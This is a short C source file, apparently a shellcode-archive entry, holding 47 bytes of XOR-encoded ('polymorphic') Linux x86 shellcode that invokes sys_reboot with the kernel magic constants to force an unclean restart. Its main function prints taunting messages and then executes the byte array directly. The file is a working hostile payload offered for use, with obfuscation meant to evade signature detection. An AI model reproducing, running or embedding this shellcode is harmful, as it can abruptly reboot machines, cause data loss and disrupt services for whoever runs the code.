/*
 * sys_reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2, LINUX_REBOOT_CMD_RESTART);
 * parameter_1 : LINUX_REBOOT_MAGIC1 = 0xfee1dead
 * parameter_2 : LINUX_REBOOT_MAGIC2 = 672274793
 * parameter_3 : LINUX_REBOOT_CMD_RESTART = 0x01234567
 *
 * 47 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

char unclean_reboot[] = "\xeb\x0d\x5e\x31\xc9\xb1\x1b\x80\x36\x2a"
			"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
			"\x1b\xea\x9a\x72\x91\x87\xf4\xcb\xd4\x93"
			"\x43\x33\x38\x02\x90\x4d\x6f\x09\x2b\xe7"
			"\xaa\x1b\xea\x9a\x2b\xe7\xaa";

int main(void) {
  int unclean_len = strlen(unclean_reboot);
  printf("[+] Using key mutation engine : 0x2a\n");
  printf("[+] Length of this shellcode is : %d bytes\n", unclean_len);
  printf("[+] Evil has come.... please wait..... hahahahahahhahah\n");
  sleep(1);
  (*(void(*)())unclean_reboot)();
  return 0;
}
